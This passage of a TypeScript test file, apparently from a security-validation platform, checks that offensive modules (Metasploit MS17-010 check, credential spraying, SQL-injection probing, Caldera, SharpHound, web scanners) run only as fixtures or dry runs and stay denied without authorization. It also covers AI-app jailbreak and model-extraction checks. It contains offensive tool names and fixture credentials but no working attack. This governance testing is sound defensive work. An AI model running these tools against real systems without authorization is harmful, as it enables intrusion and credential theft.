          validationCategory: "JailbreakGuardrailBypass"
        }
      })
    );

    expect(output.outcome).toBe("ai_risk_observed");
    expect(output.validationState).toBe("Exploitable");
    expect(output.signals[0]?.signalSubcategory).toBe("GuardrailBypassed");
    expect(output.evidence[0]?.attributes).toMatchObject({
      measured: true,
      passFail: "fail"
    });
  });

  it("fails closed to Inconclusive when a truncated response hides the canary", async () => {
    const fetchMock = vi.fn<typeof fetch>(async (_url, init) => {
      const request = JSON.parse(String(init?.body ?? "{}")) as {
        input: string;
      };
      const canary = request.input.match(/PERISCAN_CANARY_[A-F0-9]+/u)?.[0];
      // Prefix fills the byte budget; canary arrives only after truncation.
      const padding = "A".repeat(512);
      return new Response(`${padding}${canary ?? "PERISCAN_CANARY_DEAD"}`, {
        status: 200
      });
    });
    vi.stubGlobal("fetch", fetchMock);

    const output = await executeModuleById(
      "ai_app.safe_validation",
      createContext({
        safetyLevel: "ControlledValidation",
        target: {
          appName: "Truncating Copilot",
          boundedSuite: true,
          corpusVersion: "periscan-benign-v1",
          endpointUrl: "http://127.0.0.1:3999/ai",
          harness: "periscan",
          maxRequests: 1,
          maxResponseBytes: 512,
          timeoutSeconds: 1,
          validationCategory: "ModelExtractionResistance"
        }
      })
    );

    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals[0]?.signalSubcategory).toBe("Inconclusive");
    expect(output.evidence[0]?.attributes).toMatchObject({
      measured: false,
      passFail: "inconclusive"
    });
    expect(output.evidence[1]?.attributes.outcome).toBe("Inconclusive");
    expect(JSON.stringify(output.evidence)).not.toContain(
      "ExtractionResistanceHeld"
    );
    expect(JSON.stringify(output.evidence)).toMatch(/truncated/i);
  });

  it("runs the dry-run atomic control validation suite", async () => {
    const controlSourceId = randomUUID();
    const output = await executeModuleById(
      "atomic.control_validation_safe",
      createContext({
        safetyLevel: "BASLite",
        target: {
          controlSourceId,
          dryRun: true,
          fixtureOutcome: "Blocked",
          techniqueId: "T1595"
        }
      })
    );

    expect(output.validationState).toBe("Blocked");
    expect(output.outcome).toBe("scenario_blocked");
    expect(output.signals[0]?.signalCategory).toBe("Audit");
    expect(output.signals[0]?.signalSubcategory).toBe(
      "ValidationScenarioImported"
    );
    expect(output.signals[0]?.techniqueIds).toContain("T1595");
    expect(output.evidence[0]?.attributes.scenarioHarness).toBe(
      "atomic-content-import"
    );
    expect(output.evidence[0]?.attributes.measured).toBe(false);
    expect(output.evidence[0]?.attributes.dryRunImport).toBe(true);
  });

  it("defaults bare Atomic dry-run to NoEvidence / Inconclusive (P05-2)", async () => {
    const output = await executeModuleById(
      "atomic.control_validation_safe",
      createContext({
        safetyLevel: "BASLite",
        target: {
          controlSourceId: randomUUID(),
          dryRun: true,
          techniqueId: "T1595"
        }
      })
    );

    expect(output.validationState).toBe("Inconclusive");
    expect(output.outcome).toBe("scenario_noevidence");
    expect(output.signals[0]?.signalSubcategory).toBe(
      "ValidationScenarioImported"
    );
    expect(output.evidence[0]?.attributes.measured).toBe(false);
  });

  it("refuses non-dry-run Atomic execution in the module layer", async () => {
    const output = await executeModuleById(
      "atomic.control_validation_safe",
      createContext({
        safetyLevel: "BASLite",
        target: {
          controlSourceId: randomUUID(),
          dryRun: false,
          techniqueId: "T1595"
        }
      })
    );

    expect(output.outcome).toBe("live_execution_disabled");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.errors[0]).toMatch(/disabled/i);
  });

  it("labels Atomic as dry-run scenario import, not live inject BAS (P05-3)", () => {
    const atomic = getModuleById("atomic.control_validation_safe");
    expect(atomic).toBeDefined();
    expect(atomic!.manifest.liveSupported).toBe(false);
    expect(atomic!.manifest.name.toLowerCase()).toContain("dry-run");
    expect(atomic!.manifest.name.toLowerCase()).toContain("not live inject");
    expect(atomic!.manifest.capabilityName.toLowerCase()).toContain("dry-run");
    expect(atomic!.manifest.customerVisibleDescription).toMatch(
      /not live inject bas/i
    );
    expect(atomic!.manifest.customerVisibleDescription).toMatch(/dry-run/i);
    // Never market Atomic as competitive closed-loop inject BAS.
    expect(atomic!.manifest.customerVisibleDescription.toLowerCase()).not.toMatch(
      /executes attack techniques against endpoints/
    );
  });

  it("labels detection marker probe as correlation-only, not closed inject-and-observe (P13-4)", () => {
    const probe = getModuleById("periscan.detection_marker_probe");
    expect(probe).toBeDefined();
    expect(probe!.manifest.name.toLowerCase()).toContain("correlation");
    expect(probe!.manifest.customerVisibleDescription.toLowerCase()).toContain(
      "does not emit"
    );
    expect(probe!.manifest.customerVisibleDescription.toLowerCase()).not.toMatch(
      /emits a benign/
    );
  });

  it("registers signed Wave B emit→observe module as benign-marker class only", () => {
    const loop = getModuleById("periscan.detection_marker_emit_observe");
    expect(loop).toBeDefined();
    expect(loop!.manifest.customerVisibleDescription.toLowerCase()).toMatch(
      /benign.?marker/
    );
    expect(loop!.manifest.customerVisibleDescription.toLowerCase()).toMatch(
      /not full att&ck/
    );
    expect(loop!.manifest.customerVisibleDescription.toLowerCase()).toMatch(
      /not atomic live/
    );
    expect(loop!.manifest.safetyLevel).toBe("ActiveNonInvasive");
  });

  it("imports BloodHound-compatible identity graph data without using collectors", async () => {
    const fixtureGraphPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/bloodhound/identity-graph-fixture.json"
    );
    const output = await executeModuleById(
      "bloodhound.identity_pathing",
      createContext({
        target: {
          fixtureGraphPath,
          graphName: "demo-identity"
        }
      })
    );

    expect(output.outcome).toBe("identity_path_observed");
    // Graph import is not hop measurement — never Validated/Fixed as path proof.
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals.map((signal) => signal.signalSubcategory)).toContain(
      "PrivilegedPathObserved"
    );
    expect(output.evidence[0]?.attributes.sharpHoundCollectorUsed).toBe(false);
    expect(output.evidence[0]?.attributes.measured).toBe(false);
    expect(output.evidence[0]?.attributes.fixture).toBe(true);
  });

  it("imports a Caldera plan as evidence without enabling live execution", async () => {
    const fixturePlanPath = path.resolve(
      path.dirname(fileURLToPath(import.meta.url)),
      "../fixtures/caldera/operation-plan-fixture.json"
    );
    const output = await executeModuleById(
      "caldera.advanced_adversarial",
      createContext({
        safetyLevel: "AdvancedAdversarial",
        target: {
          fixturePlanPath
        }
      })
    );

    expect(output.outcome).toBe("advanced_adversarial_plan_imported");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.evidence[0]?.attributes.executionDeniedByDefault).toBe(true);
  });

  it("derives runMode from executionMode when not explicitly declared", () => {
    const runnerModule = getModuleById("runner.reachability_check");
    const controlPlaneModule = getModuleById("periscan.http_health_check");

    // InternalRunner modules run on the agent; control-plane modules reach their
    // target directly from the SaaS.
    expect(getModuleRunMode(runnerModule!.manifest)).toBe("AgentLocal");
    expect(getModuleRunMode(controlPlaneModule!.manifest)).toBe(
      "ServiceDirect"
    );

    // An explicit runMode overrides the derivation.
    expect(
      getModuleRunMode({
        ...controlPlaneModule!.manifest,
        runMode: "ServiceViaProxy"
      })
    ).toBe("ServiceViaProxy");
  });

  it("denies offensive module starts that lack authorization", () => {
    const atomic = getModuleById("atomic.control_validation_safe");
    const bloodhound = getModuleById("bloodhound.identity_pathing");
    const caldera = getModuleById("caldera.advanced_adversarial");

    // Atomic live (dryRun:false) is disabled before authorization checks.
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "ControlPlane",
        moduleManifests: [atomic!.manifest],
        runnerId: null,
        target: { dryRun: false }
      })
    ).toMatchObject({
      allowed: false,
      code: "atomic_live_disabled"
    });
    // SharpHound collection is legal-review blocked before authorization checks.
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "ControlPlane",
        moduleManifests: [bloodhound!.manifest],
        runnerId: null,
        target: { collector: "sharphound" }
      })
    ).toMatchObject({
      allowed: false,
      code: "sharphound_collector_legal_review_blocked"
    });
    // Caldera (always offensive) without a verified scope is denied.
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "InternalRunner",
        moduleManifests: [caldera!.manifest],
        runnerId: randomUUID(),
        target: {}
      })
    ).toMatchObject({
      allowed: false,
      code: "advanced_adversarial_requires_verified_scope"
    });
    // Verified scope but no operator approval is still denied.
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "InternalRunner",
        moduleManifests: [caldera!.manifest],
        runnerId: randomUUID(),
        target: { scopeVerified: true }
      })
    ).toMatchObject({
      allowed: false,
      code: "advanced_adversarial_requires_approval"
    });
    // Authorized but live (dryRun:false) remains disabled in this release.
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "InternalRunner",
        moduleManifests: [caldera!.manifest],
        runnerId: randomUUID(),
        target: {
          approvalId: randomUUID(),
          authorizedOffensive: true,
          dryRun: false,
          scopeVerified: true
        }
      })
    ).toMatchObject({
      allowed: false,
      code: "advanced_adversarial_live_permanently_disabled"
    });
  });

  it("allows governed non-executing plans but keeps disabled live/collector paths blocked", () => {
    const caldera = getModuleById("caldera.advanced_adversarial");
    const atomic = getModuleById("atomic.control_validation_safe");
    const bloodhound = getModuleById("bloodhound.identity_pathing");

    const authorized = {
      approvalId: randomUUID(),
      authorizedOffensive: true,
      scopeVerified: true
    };

    // Caldera plan import, dry-run by default, fully authorized → allowed.
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "InternalRunner",
        moduleManifests: [caldera!.manifest],
        runnerId: randomUUID(),
        target: { ...authorized }
      })
    ).toMatchObject({ allowed: true });

    // Atomic live remains blocked even with historical approval metadata.
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "InternalRunner",
        moduleManifests: [atomic!.manifest],
        runnerId: randomUUID(),
        target: { ...authorized, dryRun: false, liveExecutionApproved: true }
      })
    ).toMatchObject({
      allowed: false,
      code: "atomic_live_disabled"
    });

    // P05-3: destructive tier must not lift Atomic live at start constraints.
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "InternalRunner",
        moduleManifests: [atomic!.manifest],
        runnerId: randomUUID(),
        target: {
          ...authorized,
          authorizedDestructive: true,
          dryRun: false
        }
      })
    ).toMatchObject({
      allowed: false,
      code: "atomic_live_disabled"
    });

    // SharpHound collector remains blocked pending legal/security review.
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "InternalRunner",
        moduleManifests: [bloodhound!.manifest],
        runnerId: randomUUID(),
        target: { ...authorized, collector: "sharphound" }
      })
    ).toMatchObject({
      allowed: false,
      code: "sharphound_collector_legal_review_blocked"
    });

    // A passive module with no offensive target is unaffected.
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "ControlPlane",
        moduleManifests: [bloodhound!.manifest],
        runnerId: null,
        target: {}
      })
    ).toMatchObject({ allowed: true });
  });

  it("registers the internal runner reachability module without fabricating reachability", async () => {
    const output = await executeModuleById(
      "runner.reachability_check",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ActiveNonInvasive",
        target: {
          ports: [443],
          targetHost: "app-01.corp.example.internal",
          timeoutSeconds: 5
        }
      })
    );

    // Without an explicit fixture flag the control plane must NOT synthesize a
    // reachable result; real reachability is measured by the Go runner.
    expect(output.outcome).toBe("requires_runner_execution");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes.reachabilityMeasured).toBe(false);
  });

  it("emits a fixture reachability result only when explicitly requested", async () => {
    const output = await executeModuleById(
      "runner.reachability_check",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureReachable: true,
          ports: [443],
          targetHost: "app-01.corp.example.internal",
          timeoutSeconds: 5
        }
      })
    );

    expect(output.outcome).toBe("reachable");
    expect(output.validationState).toBe("Reachable");
    expect(output.signals[0]?.sourceType).toBe(
      "runner.reachability_check.reachability"
    );
    expect(output.evidence[0]?.attributes.fixture).toBe(true);
  });
});

describe("recon nmap modules (runner-agent / AgentLocal)", () => {
  it("inventories live hosts in fixture mode without invoking nmap", async () => {
    const output = await executeModuleById(
      "recon.host_discovery",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureHosts: ["10.0.0.5", "10.0.0.6"],
          fixtureMode: true,
          targets: "10.0.0.0/24"
        }
      })
    );

    expect(output.outcome).toBe("hosts_discovered");
    expect(output.validationState).toBe("Reachable");
    expect(output.evidence[0]?.attributes.hostCount).toBe(2);
    expect(output.evidence[0]?.attributes.measured).toBe(true);
  });

  it("reports no live hosts honestly when fixture discovery is empty", async () => {
    const output = await executeModuleById(
      "recon.host_discovery",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureHosts: [],
          fixtureMode: true,
          targets: "10.0.0.0/30"
        }
      })
    );

    expect(output.outcome).toBe("no_live_hosts");
    expect(output.validationState).toBe("Inconclusive");
  });

  it("inventories open services in fixture mode", async () => {
    const output = await executeModuleById(
      "recon.service_inventory",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureMode: true,
          fixtureServices: [{ host: "10.0.0.5", port: 443, service: "https" }],
          targetHost: "10.0.0.5"
        }
      })
    );

    expect(output.outcome).toBe("services_inventoried");
    expect(output.evidence[0]?.attributes.openPortCount).toBe(1);
  });
});

describe("nmap grepable parsing", () => {
  it("is exercised through the recon service inventory fixture path", async () => {
    // The live grepable parser is covered indirectly; fixture mode keeps CI
    // free of any live nmap invocation.
    const output = await executeModuleById(
      "recon.service_inventory",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ActiveNonInvasive",
        target: { fixtureMode: true, targetHost: "10.0.0.9" }
      })
    );
    expect(output.outcome).toBe("services_inventoried");
  });
});

describe("web app scanning modules", () => {
  it("audits TLS fixture weaknesses without stamping Validated + measured", async () => {
    const output = await executeModuleById(
      "web.tls_audit",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureMode: true,
          fixtureWeaknesses: ["SSLv3_supported", "RC4_ciphers"],
          url: "https://app.corp.internal"
        }
      })
    );

    expect(output.outcome).toBe("tls_weaknesses_found");
    // Fixture-only (liveSupported:false): never Validated/Fixed with measured:true.
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals[0]?.signalSubcategory).toBe("WeakTlsConfiguration");
    expect(output.evidence[0]?.attributes.weaknessCount).toBe(2);
    expect(output.evidence[0]?.attributes.measured).toBe(false);
    expect(output.evidence[0]?.attributes.fixture).toBe(true);
  });

  it("reports a clean TLS fixture as Inconclusive (not Fixed proof)", async () => {
    const output = await executeModuleById(
      "web.tls_audit",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureMode: true,
          fixtureWeaknesses: [],
          url: "https://app.corp.internal"
        }
      })
    );

    expect(output.outcome).toBe("tls_configuration_strong");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes.measured).toBe(false);
  });

  it("testssl live TLS audit is disabled pending legal and safety review", async () => {
    const module = getModuleById("web.tls_audit");

    expect(getOpenSourceToolDefinition("testssl")?.policyStatus).toBe(
      "RequiresLegalReview"
    );
    expect(module?.manifest.liveSupported).toBe(false);
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "ControlPlane",
        moduleManifests: [module!.manifest],
        runnerId: null,
        target: { url: "https://app.corp.internal" }
      })
    ).toMatchObject({
      allowed: false,
      code: "testssl_live_disabled"
    });

    const output = await executeModuleById(
      "web.tls_audit",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: { url: "https://app.corp.internal" }
      })
    );

    expect(output.outcome).toBe("testssl_live_execution_disabled");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes).toMatchObject({
      legalReviewRequired: true,
      liveExecutionDisabled: true,
      measured: false,
      scannerDisabledByDefault: true,
      url: "https://app.corp.internal"
    });
  });

  it("records SQL injection fixture without stamping Validated + measured", async () => {
    const output = await executeModuleById(
      "web.sqli_probe",
      createContext({
        safetyLevel: "ControlledValidation",
        target: {
          fixtureMode: true,
          fixtureVulnerable: true,
          url: "https://app.corp.internal/item?id=1"
        }
      })
    );

    expect(output.outcome).toBe("sqli_confirmed");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals[0]?.signalSubcategory).toBe("SqlInjection");
    expect(output.evidence[0]?.attributes.measured).toBe(false);
    expect(output.evidence[0]?.attributes.fixture).toBe(true);
  });

  it("plans only (Inconclusive) when sqli_probe is not explicitly live", async () => {
    const output = await executeModuleById(
      "web.sqli_probe",
      createContext({
        safetyLevel: "ControlledValidation",
        target: { url: "https://app.corp.internal/item?id=1" }
      })
    );

    expect(output.outcome).toBe("sqli_probe_planned");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.evidence[0]?.attributes.measured).toBe(false);
  });

  it("blocks direct SQL injection live execution in the module layer", async () => {
    const output = await executeModuleById(
      "web.sqli_probe",
      createContext({
        safetyLevel: "ControlledValidation",
        target: {
          dryRun: false,
          url: "https://app.corp.internal/item?id=1"
        }
      })
    );

    expect(output.outcome).toBe("sqli_live_execution_disabled");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes.liveExecutionDisabled).toBe(true);
    expect(output.evidence[0]?.attributes.measured).toBe(false);
  });

  it("governs sqli_probe: denied without authorization, allowed once authorized", () => {
    const sqli = getModuleById("web.sqli_probe");
    const authorized = {
      approvalId: randomUUID(),
      authorizedOffensive: true,
      scopeVerified: true
    };

    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "ControlPlane",
        moduleManifests: [sqli!.manifest],
        runnerId: null,
        target: {}
      })
    ).toMatchObject({ allowed: false });

    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "ControlPlane",
        moduleManifests: [sqli!.manifest],
        runnerId: null,
        target: authorized
      })
    ).toMatchObject({ allowed: true });

    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "ControlPlane",
        moduleManifests: [sqli!.manifest],
        runnerId: null,
        target: { ...authorized, dryRun: false }
      })
    ).toMatchObject({
      allowed: false,
      code: "web_sqli_probe_live_permanently_disabled"
    });
  });
});

describe("projectdiscovery recon modules (subfinder/httpx/dnsx)", () => {
  it("enumerates subdomains in fixture mode", async () => {
    const output = await executeModuleById(
      "recon.subdomain_enum",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "PassiveReadOnly",
        target: {
          domain: "corp.example",
          fixtureMode: true,
          fixtureSubdomains: ["api.corp.example", "vpn.corp.example"]
        }
      })
    );
    expect(output.outcome).toBe("subdomains_discovered");
    expect(output.evidence[0]?.attributes.subdomainCount).toBe(2);
  });

  it("probes live HTTP endpoints in fixture mode", async () => {
    const output = await executeModuleById(
      "recon.http_probe",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureEndpoints: ["https://api.corp.example"],
          fixtureMode: true,
          host: "api.corp.example"
        }
      })
    );
    expect(output.outcome).toBe("endpoints_probed");
    expect(output.evidence[0]?.attributes.endpointCount).toBe(1);
  });

  it("resolves DNS records in fixture mode", async () => {
    const output = await executeModuleById(
      "recon.dns_probe",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureMode: true,
          fixtureRecords: ["api.corp.example [A] [10.0.0.5]"],
          host: "api.corp.example"
        }
      })
    );
    expect(output.outcome).toBe("dns_records_resolved");
    expect(output.evidence[0]?.attributes.recordCount).toBe(1);
  });
});

describe("additional web modules (ffuf/zap/nikto/whatweb)", () => {
  it("ffuf content discovery (fixture) returns discovered paths", async () => {
    const output = await executeModuleById(
      "web.content_discovery",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureMode: true,
          fixturePaths: ["/admin"],
          url: "https://app.corp.example"
        }
      })
    );
    expect(output.outcome).toBe("paths_discovered");
    expect(output.evidence[0]?.attributes.pathCount).toBe(1);
  });

  it("ffuf content discovery live fuzzing is disabled by default", async () => {
    const module = getModuleById("web.content_discovery");

    expect(module?.manifest.liveSupported).toBe(false);
    expect(module?.manifest.resourceLimits.maxNetworkRequests).toBe(1);
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "ControlPlane",
        moduleManifests: [module!.manifest],
        runnerId: null,
        target: { url: "https://app.corp.example" }
      })
    ).toMatchObject({
      allowed: false,
      code: "content_discovery_live_disabled"
    });

    const output = await executeModuleById(
      "web.content_discovery",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          url: "https://app.corp.example",
          wordlist: "/usr/share/seclists/Discovery/Web-Content/common.txt"
        }
      })
    );

    expect(output.outcome).toBe("content_discovery_live_execution_disabled");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes).toMatchObject({
      fuzzingDisabledByDefault: true,
      liveExecutionDisabled: true,
      measured: false,
      pathCount: 0,
      url: "https://app.corp.example"
    });
  });

  it("zap baseline flags medium/high alerts as a measured exposure", async () => {
    const output = await executeModuleById(
      "web.zap_baseline",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureAlerts: [{ name: "Missing CSP", risk: "Medium (Medium)" }],
          fixtureMode: true,
          url: "https://app.corp.example"
        }
      })
    );
    expect(output.outcome).toBe("zap_alerts_found");
    expect(output.signals[0]?.signalSubcategory).toBe("WebBaselineAlert");
  });

  it("zap baseline with no serious alerts is Fixed", async () => {
    const output = await executeModuleById(
      "web.zap_baseline",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureAlerts: [],
          fixtureMode: true,
          url: "https://app.corp.example"
        }
      })
    );
    expect(output.outcome).toBe("zap_baseline_clean");
    expect(output.signals).toHaveLength(0);
  });

  it("nikto fixture findings never stamp Validated + measured", async () => {
    const output = await executeModuleById(
      "web.nikto_scan",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureFindings: ["Server leaks version"],
          fixtureMode: true,
          url: "https://app.corp.example"
        }
      })
    );
    expect(output.outcome).toBe("nikto_findings");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals[0]?.signalSubcategory).toBe(
      "WebServerMisconfiguration"
    );
    expect(output.evidence[0]?.attributes.measured).toBe(false);
    expect(output.evidence[0]?.attributes.fixture).toBe(true);
  });

  it("nikto live scanning is disabled pending legal and safety review", async () => {
    const module = getModuleById("web.nikto_scan");

    expect(getOpenSourceToolDefinition("nikto")?.policyStatus).toBe(
      "RequiresLegalReview"
    );
    expect(module?.manifest.license).toBe("GPL-2.0");
    expect(module?.manifest.licenseRisk).toBe("RequiresLegalReview");
    expect(module?.manifest.liveSupported).toBe(false);
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "ControlPlane",
        moduleManifests: [module!.manifest],
        runnerId: null,
        target: { url: "https://app.corp.example" }
      })
    ).toMatchObject({
      allowed: false,
      code: "nikto_live_disabled"
    });

    const output = await executeModuleById(
      "web.nikto_scan",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: { url: "https://app.corp.example" }
      })
    );

    expect(output.outcome).toBe("nikto_live_execution_disabled");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes).toMatchObject({
      legalReviewRequired: true,
      liveExecutionDisabled: true,
      measured: false,
      scannerDisabledByDefault: true,
      url: "https://app.corp.example"
    });
  });

  it("whatweb fingerprints technologies (evidence-only)", async () => {
    const output = await executeModuleById(
      "web.fingerprint",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          fixtureMode: true,
          fixtureTechnologies: ["nginx", "React", "Cloudflare"],
          url: "https://app.corp.example"
        }
      })
    );
    expect(output.outcome).toBe("technologies_identified");
    expect(output.evidence[0]?.attributes.technologyCount).toBe(3);
    expect(output.signals).toHaveLength(0);
  });

  it("whatweb live fingerprinting is disabled pending legal and safety review", async () => {
    const module = getModuleById("web.fingerprint");

    expect(getOpenSourceToolDefinition("whatweb")?.policyStatus).toBe(
      "RequiresLegalReview"
    );
    expect(module?.manifest.liveSupported).toBe(false);
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "ControlPlane",
        moduleManifests: [module!.manifest],
        runnerId: null,
        target: { url: "https://app.corp.example" }
      })
    ).toMatchObject({
      allowed: false,
      code: "whatweb_live_disabled"
    });

    const output = await executeModuleById(
      "web.fingerprint",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: { url: "https://app.corp.example" }
      })
    );

    expect(output.outcome).toBe("whatweb_live_execution_disabled");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes).toMatchObject({
      legalReviewRequired: true,
      liveExecutionDisabled: true,
      measured: false,
      scannerDisabledByDefault: true,
      url: "https://app.corp.example"
    });
  });
});

describe("offensive kit modules (netexec/scoutsuite/metasploit)", () => {
  it("cred_spray plans only (Inconclusive) when not explicitly live", async () => {
    const output = await executeModuleById(
      "identity.cred_spray",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ControlledValidation",
        target: { targetHost: "dc01.corp.internal" }
      })
    );
    expect(output.outcome).toBe("cred_spray_planned");
    expect(output.validationState).toBe("Inconclusive");
  });

  it("cred_spray fixture credentials never stamp Validated + measured", async () => {
    const output = await executeModuleById(
      "identity.cred_spray",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ControlledValidation",
        target: {
          fixtureMode: true,
          fixtureValidCredentials: ["[+] corp\\svc:Spring2024"],
          targetHost: "dc01.corp.internal"
        }
      })
    );
    expect(output.outcome).toBe("valid_credentials_found");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals[0]?.signalSubcategory).toBe(
      "ValidCredentialExposure"
    );
    expect(output.evidence[0]?.attributes.measured).toBe(false);
    expect(output.evidence[0]?.attributes.fixture).toBe(true);
  });

  it("scoutsuite fixture findings never stamp Validated + measured", async () => {
    const output = await executeModuleById(
      "cloud.scoutsuite_posture",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          fixtureFindings: ["s3-bucket-public-read"],
          fixtureMode: true,
          provider: "aws"
        }
      })
    );
    expect(output.outcome).toBe("cloud_posture_findings");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals[0]?.signalSubcategory).toBe("CloudPostureFinding");
    expect(output.evidence[0]?.attributes.measured).toBe(false);
    expect(output.evidence[0]?.attributes.fixture).toBe(true);
  });

  it("scoutsuite live posture assessment is disabled pending legal and safety review", async () => {
    const module = getModuleById("cloud.scoutsuite_posture");

    expect(getOpenSourceToolDefinition("scoutsuite")?.policyStatus).toBe(
      "RequiresLegalReview"
    );
    expect(module?.manifest.liveSupported).toBe(false);
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "ControlPlane",
        moduleManifests: [module!.manifest],
        runnerId: null,
        target: { provider: "aws" }
      })
    ).toMatchObject({
      allowed: false,
      code: "scoutsuite_live_disabled"
    });

    const output = await executeModuleById(
      "cloud.scoutsuite_posture",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: { provider: "aws" }
      })
    );

    expect(output.outcome).toBe("scoutsuite_live_execution_disabled");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes).toMatchObject({
      findingCount: 0,
      legalReviewRequired: true,
      liveExecutionDisabled: true,
      measured: false,
      provider: "aws",
      scannerDisabledByDefault: true
    });
  });

  it("metasploit fixture check never stamps Exploitable + measured", async () => {
    const output = await executeModuleById(
      "exploit.metasploit_check",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "AdvancedAdversarial",
        target: {
          fixtureMode: true,
          fixtureVulnerable: true,
          moduleName: "auxiliary/scanner/smb/smb_ms17_010",
          targetHost: "10.0.0.5"
        }
      })
    );
    expect(output.outcome).toBe("exploitable_confirmed");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals[0]?.signalSubcategory).toBe("ConfirmedExploitable");
    expect(output.evidence[0]?.attributes.measured).toBe(false);
    expect(output.evidence[0]?.attributes.fixture).toBe(true);
  });

  it("blocks direct credential and Metasploit live execution in the module layer", async () => {
    const credentialOutput = await executeModuleById(
      "identity.cred_spray",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ControlledValidation",
        target: {
          dryRun: false,
          password: "never-used",
          targetHost: "10.0.0.5",
          username: "svc-demo"
        }
      })
    );
    expect(credentialOutput.outcome).toBe("credential_live_execution_disabled");
    expect(credentialOutput.signals).toHaveLength(0);
    expect(credentialOutput.evidence[0]?.attributes.liveExecutionDisabled).toBe(
      true
    );
    expect(JSON.stringify(credentialOutput.evidence)).not.toContain(
      "never-used"
    );

    const metasploitOutput = await executeModuleById(
      "exploit.metasploit_check",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "AdvancedAdversarial",
        target: {
          dryRun: false,
          moduleName: "auxiliary/scanner/smb/smb_ms17_010",
          targetHost: "10.0.0.5"
        }
      })
    );
    expect(metasploitOutput.outcome).toBe("metasploit_live_execution_disabled");
    expect(metasploitOutput.signals).toHaveLength(0);
    expect(metasploitOutput.evidence[0]?.attributes.liveExecutionDisabled).toBe(
      true
    );
  });

  it("governs cred_spray + metasploit: denied without auth, allowed once authorized", () => {
    const authorized = {
      approvalId: randomUUID(),
      authorizedOffensive: true,
      scopeVerified: true
    };
    for (const moduleId of [
      "identity.cred_spray",
      "exploit.metasploit_check"
    ]) {
      const mod = getModuleById(moduleId);
      expect(
        evaluateModuleStartConstraints({
          executionEnvironment: "InternalRunner",
          moduleManifests: [mod!.manifest],
          runnerId: randomUUID(),
          target: {}
        })
      ).toMatchObject({ allowed: false });
      expect(
        evaluateModuleStartConstraints({
          executionEnvironment: "InternalRunner",
          moduleManifests: [mod!.manifest],
          runnerId: randomUUID(),
          target: { ...authorized }
        })
      ).toMatchObject({ allowed: true });
